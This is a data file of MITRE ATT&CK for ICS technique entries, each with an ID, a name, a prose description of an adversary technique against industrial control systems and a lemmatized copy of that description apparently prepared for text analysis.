T0809,Data Destruction,"Adversaries may perform data destruction over the course of an operation. The adversary may drop or create malware, tools, or other non-native files on a target system to accomplish this, potentially leaving behind traces of malicious activities. Such non-native files and other data may be removed over the course of an intrusion to maintain a small footprint or as a standard part of the post-intrusion cleanup process. Data destruction may also be used to render operator interfaces unable to respond and to disrupt response functions from occurring as expected. An adversary may also destroy data backups that are vital to recovery after an incident.Standard file deletion commands are available on most operating system and device interfaces to perform cleanup, but adversaries may use other tools as well. Two examples are Windows Sysinternals SDelete and Active@ Killdisk.",adversary perform datum destruction course operation adversary drop create malware tool non native file target system accomplish potentially leave trace malicious activity non native file datum remove course intrusion maintain small footprint standard post intrusion cleanup process datum destruction render operator interface unable respond disrupt response function occur expect adversary destroy datum backup vital recovery incident standard file deletion command available operate system device interface perform cleanup adversary use tool example windows sysinternals sdelete killdisk
T0811,Data from Information Repositories,"Adversaries may target and collect data from information repositories. This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes. Examples of information repositories include reference databases in the process environment, as well as databases in the corporate network that might contain information about the ICS.Information collected from these systems may provide the adversary with a better understanding of the operational environment, vendors used, processes, or procedures of the ICS.In a campaign between 2011 and 2013 against ONG organizations, Chinese state-sponsored actors searched document repositories for specific information such as, system manuals, remote terminal unit (RTU) sites, personnel lists, documents that included the string SCAD*, user credentials, and remote dial-up access information.",adversary target collect datum information repository include sensitive datum specification schematic diagram control system layout device process example information repository include reference database process environment database corporate network contain information collect system provide adversary well understanding operational environment vendor process procedure campaign ong organization chinese state sponsor actor search document repository specific information system manual remote terminal unit rtu site personnel list document include string scad user credential remote dial access information
T0893,Data from Local System,"Adversaries may target and collect data from local system sources, such as file systems, configuration files, or local databases. This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes.Adversaries may do this using Command-Line Interface or Scripting techniques to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",adversary target collect datum local system source file system configuration file local database include sensitive datum specification schematic diagram control system layout device process adversary command line interface scripting technique interact file system gather information adversary use automated collection local system
T0812,Default Credentials,"Adversaries may leverage manufacturer or supplier set default credentials on control system devices. These default credentials may have administrative permissions and may be necessary for initial configuration of the device. It is general best practice to change the passwords for these accounts as soon as possible, but some manufacturers may have devices that have passwords or usernames that cannot be changed. Default credentials are normally documented in an instruction manual that is either packaged with the device, published online through official means, or published online through unofficial means. Adversaries may leverage default credentials that have not been properly modified or disabled.",adversary leverage manufacturer supplier set default credential control system device default credential administrative permission necessary initial configuration device general good practice change password account soon possible manufacturer device password username change default credential normally document instruction manual package device publish online official mean publish online unofficial mean adversary leverage default credential properly modify disable
T0813,Denial of Control,"Adversaries may cause a denial of control to temporarily prevent operators and engineers from interacting with process controls. An adversary may attempt to deny process control access to cause a temporary loss of communication with the control device or to prevent operator adjustment of process controls. An affected process may still be operating during the period of control loss, but not necessarily in a desired state. In the 2017 Dallas Siren incident operators were unable to disable the false alarms from the Office of Emergency Management headquarters.",adversary cause denial control temporarily prevent operator engineer interact process control adversary attempt deny process control access cause temporary loss communication control device prevent operator adjustment process control affected process operate period control loss necessarily desire state dallas siren incident operator unable disable false alarm office emergency management headquarters
T0814,Denial of Service,"Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected device functionality. Examples of DoS attacks include overwhelming the target device with a high volume of requests in a short time period and sending the target device a request it does not know how to handle. Disrupting device state may temporarily render it unresponsive, possibly lasting until a reboot can occur. When placed in this state, devices may be unable to send and receive requests, and may not perform expected response functions in reaction to other events in the environment. Some ICS devices are particularly sensitive to DoS events, and may become unresponsive in reaction to even a simple ping sweep. Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS) against certain devices, such as in the case of the BrickerBot malware. Adversaries may exploit a software vulnerability to cause a denial of service by taking advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in software that can be used to cause a denial of service condition. Adversaries may have prior knowledge about industrial protocols or control devices used in the environment through Remote System Information Discovery. There are examples of adversaries remotely causing a Device Restart/Shutdown by exploiting a vulnerability that induces uncontrolled resource consumption.",adversary perform denial service dos attack disrupt expected device functionality example dos attack include overwhelm target device high volume request short time period send target device request know handle disrupt device state temporarily render unresponsive possibly last reboot occur place state device unable send receive request perform expected response function reaction event environment ics device particularly sensitive dos event unresponsive reaction simple ping sweep adversary attempt execute permanent denial service pdos certain device case brickerbot malware adversary exploit software vulnerability cause denial service take advantage programming error program service operate system software kernel execute adversary control code vulnerability exist software cause denial service condition adversary prior knowledge industrial protocol control device environment remote system information discovery example adversary remotely cause device restart shutdown exploit vulnerability induce uncontrolled resource consumption
T0815,Denial of View,"Adversaries may cause a denial of view in attempt to disrupt and prevent operator oversight on the status of an ICS environment. This may manifest itself as a temporary communication failure between a device and its control source, where the interface recovers and becomes available once the interference ceases. An adversary may attempt to deny operator visibility by preventing them from receiving status and reporting messages. Denying this view may temporarily block and prevent operators from noticing a change in state or anomalous behavior. The environment's data and processes may still be operational, but functioning in an unintended or adversarial manner.",adversary cause denial view attempt disrupt prevent operator oversight status ics environment manifest temporary communication failure device control source interface recover available interference cease adversary attempt deny operator visibility prevent receive status reporting message deny view temporarily block prevent operator notice change state anomalous behavior environment datum process operational function unintended adversarial manner
T0868,Detect Operating Mode,"Adversaries may gather information about a PLCs or controllers current operating mode. Operating modes dictate what change or maintenance functions can be manipulated and are often controlled by a key switch on the PLC (e.g., run, prog , and remote). Knowledge of these states may be valuable to an adversary to determine if they are able to reprogram the PLC. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below: Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic.Program Upload and Program Download are disabled while in this mode. Remote - Allows for remote changes to a PLCs operation mode. Stop - The PLC and program is stopped, while in this mode, outputs are forced off. Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization.",adversary gather information plcs controller current operating mode operating mode dictate change maintenance function manipulate control key switch plc run prog remote knowledge state valuable adversary determine able reprogram plc operating mode mechanism select vary vendor product line commonly implement operating mode describe program mode enable change device program allow program upload download device engineering workstation plcs logic halt output force run execution device program occur mode input output value point tag element etc monitor accord program logic program upload program download disable mode remote allow remote change plcs operation mode stop plc program stop mode output force reset condition plc reset original state warm reset retain memory cold reset reset o datum register test monitor mode similar run mode o process mode allow monitoring force set reset generally tuning debugging system monitor mode trial initialization
T0816,Device Restart/Shutdown,"Adversaries may forcibly restart or shutdown a device in an ICS environment to disrupt and potentially negatively impact physical processes. Methods of device restart and shutdown exist in some devices as built-in, standard functionalities. These functionalities can be executed using interactive device web interfaces, CLIs, and network protocol commands.Unexpected restart or shutdown of control system devices may prevent expected response functions happening during critical states.A device restart can also be a sign of malicious device modifications, as many updates require a shutdown in order to take effect.",adversary forcibly restart shutdown device ics environment disrupt potentially negatively impact physical process method device restart shutdown exist device build standard functionality functionality execute interactive device web interface cli network protocol command unexpected restart shutdown control system device prevent expected response function happen critical state device restart sign malicious device modification update require shutdown order effect
T0817,Drive-by Compromise,"Adversaries may gain access to a system during a drive-by compromise, when a user visits a website as part of a regular browsing session. With this technique, the user's web browser is targeted and exploited simply by visiting the compromised website. The adversary may target a specific community, such as trusted third party suppliers or other industry specific groups, which often visit the target website. This kind of targeted attack relies on a common interest, and is known as a strategic web compromise or watering hole attack. The National Cyber Awareness System (NCAS) has issued a Technical Alert (TA) regarding Russian government cyber activity targeting critical infrastructure sectors. Analysis by DHS and FBI has noted two distinct categories of victims in the Dragonfly campaign on the Western energy sector: staging and intended targets. The adversary targeted the less secure networks of staging targets, including trusted third-party suppliers and related peripheral organizations. Initial access to the intended targets used watering hole attacks to target process control, ICS, and critical infrastructure related trade publications and informational websites.",adversary gain access system drive compromise user visit website regular browsing session technique user web browser target exploit simply visit compromise website adversary target specific community trust party supplier industry specific group visit target website kind target attack rely common interest know strategic web compromise watering hole attack national cyber awareness system ncas issue technical alert ta russian government cyber activity target critical infrastructure sector analysis dhs fbi note distinct category victim dragonfly campaign western energy sector staging intended target adversary target secure network stage target include trust party supplier related peripheral organization initial access intended target watering hole attack target process control ics critical infrastructure relate trade publication informational website
T0871,Execution through API,Adversaries may attempt to leverage Application Program Interfaces (APIs) used for communication between control software and the hardware. Specific functionality is often coded into APIs which can be called by software to engage specific functions on a device or other software.,adversary attempt leverage application program interfaces apis communication control software hardware specific functionality code api call software engage specific function device software
T0819,Exploit Public-Facing Application,"Adversaries may leverage weaknesses to exploit internet-facing software for initial access into an industrial network. Internet-facing software may be user applications, underlying networking implementations, an assets operating system, weak defenses, etc. Targets of this technique may be intentionally exposed for the purpose of remote management and visibility.An adversary may seek to target public-facing applications as they may provide direct access into an ICS environment or the ability to move into the ICS network. Publicly exposed applications may be found through online tools that scan the internet for open ports and services. Version numbers for the exposed application may provide adversaries an ability to target specific known vulnerabilities. Exposed control protocol or remote access ports found in Commonly Used Port may be of interest by adversaries.",adversary leverage weakness exploit internet face software initial access industrial network internet face software user application underlie networking implementation asset operate system weak defense etc target technique intentionally expose purpose remote management visibility adversary seek target public face application provide direct access ics environment ability ics network publicly expose application find online tool scan internet open port service version number expose application provide adversary ability target specific know vulnerability exposed control protocol remote access port find commonly port interest adversary
T0820,Exploitation for Evasion,"Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to evade detection. Vulnerabilities may exist in software that can be used to disable or circumvent security features. Adversaries may have prior knowledge through Remote System Information Discovery about security features implemented on control devices. These device security features will likely be targeted directly for exploitation. There are examples of firmware RAM/ROM consistency checks on control devices being targeted by adversaries to enable the installation of malicious System Firmware.",adversary exploit software vulnerability advantage programming error program service operate system software kernel evade detection vulnerability exist software disable circumvent security feature adversary prior knowledge remote system information discovery security feature implement control device device security feature likely target directly exploitation example firmware ram rom consistency check control device target adversary enable installation malicious system firmware
T0890,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.",adversary exploit software vulnerability attempt elevate privilege exploitation software vulnerability occur adversary take advantage programming error program service operate system software kernel execute adversary control code security construct permission level hinder access information use certain technique adversary likely need perform privilege escalation include use software exploitation circumvent restriction initially gain access system adversary operate low privileged process prevent access certain resource system vulnerability exist usually operate system component software commonly run high permission exploit gain high level access system enable unprivileged user level permission system root permission depend component vulnerable necessary step adversary compromise endpoint system properly configure limit privilege escalation method
T0866,Exploitation of Remote Services,"Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to enable remote service abuse. A common goal for post-compromise exploitation of remote services is for initial access into and lateral movement throughout the ICS environment to enable access to targeted systems. ICS asset owners and operators have been affected by ransomware (or disruptive malware masquerading as ransomware) migrating from enterprise IT to ICS environments: WannaCry, NotPetya, and BadRabbit. In each of these cases, self-propagating (wormable) malware initially infected IT networks, but through exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks, producing significant impacts.",adversary exploit software vulnerability advantage programming error program service operate system software kernel enable remote service abuse common goal post compromise exploitation remote service initial access lateral movement ics environment enable access target system ics asset owner operator affect ransomware disruptive malware masquerade ransomware migrate enterprise ics environment wannacry notpetya badrabbit case self propagate wormable malware initially infect network exploit particularly target vulnerability spread industrial network produce significant impact
T0822,External Remote Services,"Adversaries may leverage external remote services as a point of initial access into your network. These services allow users to connect to internal network resources from external locations. Examples are VPNs, Citrix, and other access mechanisms. Remote service gateways often manage connections and credential authentication for these services. External remote services allow administration of a control system from outside the system. Often, vendors and internal engineering groups have access to external remote services to control system networks via the corporate network. In some cases, this access is enabled directly from the internet. While remote access enables ease of maintenance when a control system is in a remote area, compromise of remote access solutions is a liability. The adversary may use these services to gain access to and execute attacks against a control system network. Access to valid accounts is often a requirement. As they look for an entry point into the control system network, adversaries may begin searching for existing point-to-point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled.",adversary leverage external remote service point initial access network service allow user connect internal network resource external location example vpn citrix access mechanism remote service gateway manage connection credential authentication service external remote service allow administration control system outside system vendor internal engineering group access external remote service control system network corporate network case access enable directly internet remote access enable ease maintenance control system remote area compromise remote access solution liability adversary use service gain access execute attack control system network access valid account requirement look entry point control system network adversary begin search exist point point vpn implementation trust party network remote support employee connection split tunneling enable
T0823,Graphical User Interface,"Adversaries may attempt to gain access to a machine via a Graphical User Interface (GUI) to enhance execution capabilities. Access to a GUI allows a user to interact with a computer in a more visual manner than a CLI. A GUI allows users to move a cursor and click on interface objects, with a mouse and keyboard as the main input devices, as opposed to just using the keyboard.If physical access is not an option, then access might be possible via protocols such as VNC on Linux-based and Unix-based operating systems, and RDP on Windows operating systems. An adversary can use this access to execute programs and applications on the target machine.",adversary attempt gain access machine graphical user interface gui enhance execution capability access gui allow user interact computer visual manner cli gui allow user cursor click interface object mouse keyboard main input device oppose keyboard physical access option access possible protocol vnc linux base unix base operate system rdp windows operate system adversary use access execute program application target machine
T0891,Hardcoded Credentials,"Adversaries may leverage credentials that are hardcoded in software or firmware to gain an unauthorized interactive user session to an asset. Examples credentials that may be hardcoded in an asset include:Username/Passwords Cryptographic keys/Certificates API tokensUnlike Default Credentials, these credentials are built into the system in a way that they either cannot be changed by the asset owner, or may be infeasible to change because of the impact it would cause to the control system operation. These credentials may be reused across whole product lines or device models and are often not published or known to the owner and operators of the asset. Adversaries may utilize these hardcoded credentials to move throughout the control system environment or provide reliable access for their tools to interact with industrial assets.",adversary leverage credential hardcode software firmware gain unauthorized interactive user session asset example credential hardcode asset include username password cryptographic key certificate api tokensunlike default credential credential build system way change asset owner infeasible change impact cause control system operation credential reuse product line device model publish know owner operator asset adversary utilize hardcode credential control system environment provide reliable access tool interact industrial asset
T0874,Hooking,"Adversaries may hook into application programming interface (API) functions used by processes to redirect calls for execution and privilege escalation means. Windows processes often leverage these API functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. One type of hooking seen in ICS involves redirecting calls to these functions via import address table (IAT) hooking. IAT hooking uses modifications to a process IAT, where pointers to imported API functions are stored.",adversary hook application programming interface api function process redirect call execution privilege escalation mean windows process leverage api function perform task require reusable system resource windows api function typically store dynamic link library dlls export function type hooking see ics involve redirect call function import address table iat hooking iat hooking use modification process iat pointer import api function store
T0877,I/O Image,"Adversaries may seek to capture process values related to the inputs and outputs of a PLC. During the scan cycle, a PLC reads the status of all inputs and stores them in an image table. The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program. After the PLC has solved the entire logic program, it updates the output image table. The contents of this output image table are written to the corresponding output points in I/O Modules.The Input and Output Image tables described above make up the I/O Image on a PLC. This image is used by the user program instead of directly interacting with physical I/O. Adversaries may collect the I/O Image state of a PLC by utilizing a devices Native API to access the memory regions directly. The collection of the PLCs I/O state could be used to replace values or inform future stages of an attack.",adversary seek capture process value relate input output plc scan cycle plc read status input store image table image table plcs internal storage location value input output scan store execute user program plc solve entire logic program update output image table content output image table write corresponding output point o module input output image table describe o image plc image user program instead directly interact physical adversary collect o image state plc utilize device native api access memory region directly collection plcs o state replace value inform future stage attack
T0872,Indicator Removal on Host,"Adversaries may attempt to remove indicators of their presence on a system in an effort to cover their tracks. In cases where an adversary may feel detection is imminent, they may try to overwrite, delete, or cover up changes they have made to the device.",adversary attempt remove indicator presence system effort cover track case adversary feel detection imminent try overwrite delete cover change device
T0883,Internet Accessible Device,"Adversaries may gain access into industrial environments through systems exposed directly to the internet for remote access rather than through External Remote Services. Internet Accessible Devices are exposed to the internet unintentionally or intentionally without adequate protections. This may allow for adversaries to move directly into the control system network. Access onto these devices is accomplished without the use of exploits, these would be represented within the Exploit Public-Facing Application technique.Adversaries may leverage built in functions for remote access which may not be protected or utilize minimal legacy protections that may be targeted. These services may be discoverable through the use of online scanning tools. In the case of the Bowman dam incident, adversaries leveraged access to the dam control network through a cellular modem. Access to the device was protected by password authentication, although the application was vulnerable to brute forcing. In Trend Micros manufacturing deception operations adversaries were detected leveraging direct internet access to an ICS environment through the exposure of operational protocols such as Siemens S7, Omron FINS, and EtherNet/IP, in addition to misconfigured VNC access.",adversary gain access industrial environment system expose directly internet remote access external remote services internet accessible devices expose internet unintentionally intentionally adequate protection allow adversary directly control system network access device accomplish use exploit represent exploit public facing application technique adversary leverage build function remote access protect utilize minimal legacy protection target service discoverable use online scanning tool case bowman dam incident adversary leverage access dam control network cellular modem access device protect password authentication application vulnerable brute forcing trend micros manufacturing deception operation adversary detect leverage direct internet access ics environment exposure operational protocol siemens omron fins ethernet ip addition misconfigured vnc access
T0867,Lateral Tool Transfer,"Adversaries may transfer tools or other files from one system to another to stage adversary tools or other files over the course of an operation. In control systems environments, malware may use SMB and other file sharing protocols to move laterally through industrial networks.",adversary transfer tool file system stage adversary tool file course operation control system environment malware use smb file sharing protocol laterally industrial network
T0826,Loss of Availability,"Adversaries may attempt to disrupt essential components or systems to prevent owner and operator from delivering products or services. Adversaries may leverage malware to delete or encrypt critical data on HMIs, workstations, or databases.In the 2021 Colonial Pipeline ransomware incident, pipeline operations were temporally halted on May 7th and were not fully restarted until May 12th.",adversary attempt disrupt essential component system prevent owner operator deliver product service adversary leverage malware delete encrypt critical datum hmi workstation database colonial pipeline ransomware incident pipeline operation temporally halt fully restart
T0827,Loss of Control,"Adversaries may seek to achieve a sustained loss of control or a runaway condition in which operators cannot issue any commands even if the malicious interference has subsided. The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill in its 2014 IT Security Report. These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact resulted in damage and unsafe conditions from the uncontrolled shutdown of a blast furnace.",adversary seek achieve sustain loss control runaway condition operator issue command malicious interference subside german federal office information security bsi report target attack steel mill security report target attack affect industrial operation result breakdown control system component entire installation result breakdown massive impact result damage unsafe condition uncontrolled shutdown blast furnace
T0828,Loss of Productivity and Revenue,"Adversaries may cause loss of productivity and revenue through disruption and even damage to the availability and integrity of control system operations, devices, and related processes. This technique may manifest as a direct effect of an ICS-targeting attack or tangentially, due to an IT-targeting attack against non-segregated environments. In cases where these operations or services are brought to a halt, the loss of productivity may eventually present an impact for the end-users or consumers of products and services. The disrupted supply-chain may result in supply shortages and increased prices, among other consequences. A ransomware attack on an Australian beverage company resulted in the shutdown of some manufacturing sites, including precautionary halts to protect key systems. In the 2021 Colonial Pipeline ransomware incident, the pipeline was unable to transport approximately 2.5 million barrels of fuel per day to the East Coast.",adversary cause loss productivity revenue disruption damage availability integrity control system operation device related process technique manifest direct effect ics targeting attack tangentially target attack non segregated environment case operation service bring halt loss productivity eventually present impact end user consumer product service disrupted supply chain result supply shortage increase price consequence ransomware attack australian beverage company result shutdown manufacturing site include precautionary halt protect key system colonial pipeline ransomware incident pipeline unable transport approximately million barrel fuel day east coast
T0837,Loss of Protection,"Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions. This can result in equipment damage, prolonged process disruptions and hazards to personnel. Many faults and abnormal conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked. Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.",adversary compromise protective system function design prevent effect fault abnormal condition result equipment damage prolong process disruption hazard personnel fault abnormal condition process control happen quickly human operator react speed critical correct condition limit impact loss control property damage adversary target disable protective system function prerequisite subsequent attack execution allow future fault abnormal condition unchecked detection loss protection operator result shutdown process strict policy protection system cause loss productivity revenue meet technical goal adversary seek cause process disruption
T0880,Loss of Safety,Adversaries may compromise safety system functions designed to maintain safe operation of a process when unacceptable or dangerous conditions occur. Safety systems are often composed of the same elements as control systems but have the sole purpose of ensuring the process fails in a predetermined safe manner. Many unsafe conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable safety system functions as a prerequisite to subsequent attack execution or to allow for future unsafe conditionals to go unchecked. Detection of a Loss of Safety by operators can result in the shutdown of a process due to strict policies regarding safety systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.,adversary compromise safety system function design maintain safe operation process unacceptable dangerous condition occur safety system compose element control system sole purpose ensure process fail predetermine safe manner unsafe condition process control happen quickly human operator react speed critical correct condition limit impact loss control property damage adversary target disable safety system function prerequisite subsequent attack execution allow future unsafe conditional unchecked detection loss safety operator result shutdown process strict policy safety system cause loss productivity revenue meet technical goal adversary seek cause process disruption
T0829,Loss of View,"Adversaries may cause a sustained or permanent loss of view where the ICS equipment will require local, hands-on operator intervention; for instance, a restart or manual operation. By causing a sustained reporting or visibility loss, the adversary can effectively hide the present state of operations. This loss of view can occur without affecting the physical processes themselves.",adversary cause sustained permanent loss view ics equipment require local hand operator intervention instance restart manual operation cause sustained reporting visibility loss adversary effectively hide present state operation loss view occur affect physical process
T0835,Manipulate I/O Image,"Adversaries may manipulate the I/O image of PLCs through various means to prevent them from functioning as expected. Methods of I/O image manipulation may include overriding the I/O table via direct memory manipulation or using the override function used for testing PLC programs. The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program. After the PLC has solved the entire logic program, it updates the output image table. The contents of this output image table are written to the corresponding output points in I/O Modules. One of the unique characteristics of PLCs is their ability to override the status of a physical discrete input or to override the logic driving a physical output coil and force the output to a desired status.",adversary manipulate o image plcs mean prevent function expect method o image manipulation include override o table direct memory manipulation override function test plc program image table plcs internal storage location value input output scan store execute user program plc solve entire logic program update output image table content output image table write corresponding output point o modules unique characteristic plcs ability override status physical discrete input override logic drive physical output coil force output desire status
T0831,Manipulation of Control,"Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection. Methods of Manipulation of Control include: Man-in-the-middle Spoof command message Changing setpointsA Polish student used a remote controller device to interface with the Lodz city tram system in Poland.",adversary manipulate physical process control industrial environment method manipulate control include change set point value tag parameter adversary manipulate control system device possibly leverage communicate command physical control process duration manipulation temporary long sustain depend operator detection method manipulation control include man middle spoof command message change setpointsa polish student remote controller device interface lodz city tram system poland
T0832,Manipulation of View,"Adversaries may attempt to manipulate the information reported back to operators or controllers. This manipulation may be short term or sustained. During this time the process itself could be in a much different state than what is reported. Operators may be fooled into doing something that is harmful to the system in a loss of view situation. With a manipulated view into the systems, operators may issue inappropriate control sequences that introduce faults or catastrophic failures into the system. Business analysis systems can also be provided with inaccurate data leading to bad management decisions.",adversary attempt manipulate information report operator controller manipulation short term sustained time process different state report operator fool harmful system loss view situation manipulate view system operator issue inappropriate control sequence introduce fault catastrophic failure system business analysis system provide inaccurate datum lead bad management decision
T0849,Masquerading,"Adversaries may use masquerading to disguise a malicious application or executable as another file, to avoid operator and engineer suspicion. Possible disguises of these masquerading files can include commonly found programs, expected vendor executables and configuration files, and other commonplace application and naming conventions. By impersonating expected and vendor-relevant files and applications, operators and engineers may not notice the presence of the underlying malicious content and possibly end up running those masquerading as legitimate functions. Applications and other files commonly found on Windows systems or in engineering workstations have been impersonated before. This can be as simple as renaming a file to effectively disguise it in the ICS environment.",adversary use masquerade disguise malicious application executable file avoid operator engineer suspicion possible disguise masquerade file include commonly find program expected vendor executable configuration file commonplace application naming convention impersonate expected vendor relevant file application operator engineer notice presence underlie malicious content possibly end run masquerade legitimate function application file commonly find windows system engineering workstation impersonate simple rename file effectively disguise ics environment
T0838,Modify Alarm Settings,"Adversaries may modify alarm settings to prevent alerts that may inform operators of their presence or to prevent responses to dangerous and unintended scenarios. Reporting messages are a standard part of data acquisition in control systems. Reporting messages are used as a way to transmit system state information and acknowledgements that specific actions have occurred. These messages provide vital information for the management of a physical process, and keep operators, engineers, and administrators aware of the state of system devices and physical processes. If an adversary is able to change the reporting settings, certain events could be prevented from being reported. This type of modification can also prevent operators or devices from performing actions to keep the system in a safe state. If critical reporting messages cannot trigger these actions then a Impact could occur. In ICS environments, the adversary may have to use Alarm Suppression or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring. Methods of suppression often rely on modification of alarm settings, such as modifying in memory code to fixed values or tampering with assembly level instruction code.",adversary modify alarm setting prevent alert inform operator presence prevent response dangerous unintended scenario reporting message standard datum acquisition control system reporting message way transmit system state information acknowledgement specific action occur message provide vital information management physical process operator engineer administrator aware state system device physical process adversary able change reporting setting certain event prevent report type modification prevent operator device perform action system safe state critical reporting message trigger action impact occur ics environment adversary use alarm suppression contend multiple alarm alarm propagation achieve specific goal evade detection prevent intended response occur method suppression rely modification alarm setting modify memory code fix value tamper assembly level instruction code
T0821,Modify Controller Tasking,"Adversaries may modify the tasking of a controller to allow for the execution of their own programs. This can allow an adversary to manipulate the execution flow and behavior of a controller. According to 61131-3, the association of a Task with a Program Organization Unit (POU) defines a task association. An adversary may modify these associations or create new ones to manipulate the execution flow of a controller. Modification of controller tasking can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append.Tasks have properties, such as interval, frequency and priority to meet the requirements of program execution. Some controller vendors implement tasks with implicit, pre-defined properties whereas others allow for these properties to be formulated explicitly. An adversary may associate their program with tasks that have a higher priority or execute associated programs more frequently. For instance, to ensure cyclic execution of their program on a Siemens controller, an adversary may add their program to the task, Organization Block 1 (OB1).",adversary modify tasking controller allow execution program allow adversary manipulate execution flow behavior controller accord association task program organization unit pou define task association adversary modify association create new one manipulate execution flow controller modification controller tasking accomplish program download addition type program modification online edit program append task property interval frequency priority meet requirement program execution controller vendor implement task implicit pre defined property allow property formulate explicitly adversary associate program task high priority execute associate program frequently instance ensure cyclic execution program siemens controller adversary add program task organization block
T0836,Modify Parameter,"Adversaries may modify parameters used to instruct industrial control system devices. These devices operate via programs that dictate how and when to perform actions based on such parameters. Such parameters can determine the extent to which an action is performed and may specify additional options. For example, a program on a control system device dictating motor processes may take a parameter defining the total number of seconds to run that motor. An adversary can potentially modify these parameters to produce an outcome outside of what was intended by the operators. By modifying system and process critical parameters, the adversary may cause Impact to equipment and/or control processes. Modified parameters may be turned into dangerous, out-of-bounds, or unexpected values from typical operations. For example, specifying that a process run for more or less time than it should, or dictating an unusually high, low, or invalid value as a parameter.",adversary modify parameter instruct industrial control system device device operate program dictate perform action base parameter parameter determine extent action perform specify additional option example program control system device dictate motor process parameter define total number second run motor adversary potentially modify parameter produce outcome outside intend operator modify system process critical parameter adversary cause impact equipment control process modify parameter turn dangerous bounds unexpected value typical operation example specify process run time dictate unusually high low invalid value parameter
T0889,Modify Program,"Adversaries may modify or add a program on a controller to affect how it interacts with the physical process, peripheral devices and other hosts on the network. Modification to controller programs can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append. Program modification encompasses the addition and modification of instructions and logic contained in Program Organization Units (POU) and similar programming elements found on controllers. This can include, for example, adding new functions to a controller, modifying the logic in existing functions and making new calls from one function to another. Some programs may allow an adversary to interact directly with the native API of the controller to take advantage of obscure features or vulnerabilities.",adversary modify add program controller affect interact physical process peripheral device host network modification controller program accomplish program download addition type program modification online edit program append program modification encompass addition modification instruction logic contain program organization units pou similar programming element find controller include example add new function controller modify logic exist function make new call function program allow adversary interact directly native api controller advantage obscure feature vulnerability
T0839,Module Firmware,"Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment. This technique is similar to System Firmware, but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. An easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time. Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return. Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator. A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise. Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",adversary install malicious vulnerable firmware modular hardware device control system device contain modular hardware device device set firmware separate firmware main control system equipment technique similar system firmware conduct system component capability level integrity checking result device image malicious device firmware provide persistent access remain device easy point access adversary ethernet card cpu ram operate system adversary attack likely exploit computer ethernet card exploitation ethernet card computer enable adversary accomplish additional attack follow delay attack adversary stage attack advance choose launch particularly damaging time brick ethernet card malicious firmware program result ethernet card failure require factory return random attack failure adversary load malicious firmware multiple field device 